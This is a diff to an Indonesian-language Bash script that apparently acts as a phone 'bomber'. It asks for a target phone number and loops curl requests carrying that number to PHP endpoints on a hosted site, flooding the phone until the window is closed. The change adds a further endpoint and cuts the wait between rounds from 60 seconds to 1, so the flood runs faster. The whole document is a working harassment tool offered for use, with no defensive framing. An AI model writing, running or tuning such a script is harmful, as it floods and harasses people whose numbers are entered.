@@ -22,8 +22,12 @@ read -p "Input No HP: " anjg;
 echo ""  
 echo -e $yellow"Sedang mencoba Ngebom :)"
 echo -e $okegreen"Selama Ngga di Close bakal Ngebom terus :)"
+echo -e $okegreen""
+echo -e $cyan">>>> Hasil >>>>"
 if [ $anjg ]
 then
-curl "https://sandroewek.000webhostapp.com/tel2.php?nohp=$anjg"
-sleep 60
+curl "https://sandroewek.000webhostapp.com/mm/r.php"
+echo -e $cyan">>>> Hasil >>>>"
+curl "https://sandroewek.000webhostapp.com/tel3.php?nohp=$anjg"
+sleep 1
 fi 
